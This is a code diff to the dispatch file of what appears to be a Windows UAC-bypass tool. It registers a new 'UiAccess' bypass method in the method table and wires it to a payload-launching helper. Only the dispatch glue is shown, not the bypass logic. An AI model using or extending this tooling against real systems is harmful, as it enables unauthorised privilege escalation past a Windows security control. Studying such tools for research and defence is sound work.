@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     2.70
+*  VERSION:     2.71
 *
-*  DATE:        25 Mar 2017
+*  DATE:        06 May 2017
 *
 *  UAC bypass dispatch.
 *
@@ -43,6 +43,7 @@ UCM_API(MethodSandworm);
 UCM_API(MethodEnigma0x3_3);
 UCM_API(MethodWow64Logger);
 UCM_API(MethodEnigma0x3_4);
+UCM_API(MethodUiAccess);
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodTest, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
@@ -76,7 +77,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodSandworm, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodEnigma0x3_3, NULL, { 10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodWow64Logger, NULL, { 7600, MAXDWORD }, AKATSUKI_ID, FALSE, TRUE, TRUE },
-    { MethodEnigma0x3_4, NULL, {10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }
+    { MethodEnigma0x3_4, NULL, {10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodUiAccess, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -612,4 +614,12 @@ UCM_API(MethodEnigma0x3_4)
         lpszPayload = g_ctx.szOptionalParameter;
 
     return ucmSdcltIsolatedCommandMethod(lpszPayload);
+}
+
+UCM_API(MethodUiAccess)
+{
+    UNREFERENCED_PARAMETER(Method);
+    UNREFERENCED_PARAMETER(ExtraContext);
+
+    return ucmUiAccessMethod(PayloadCode, PayloadSize);
 }
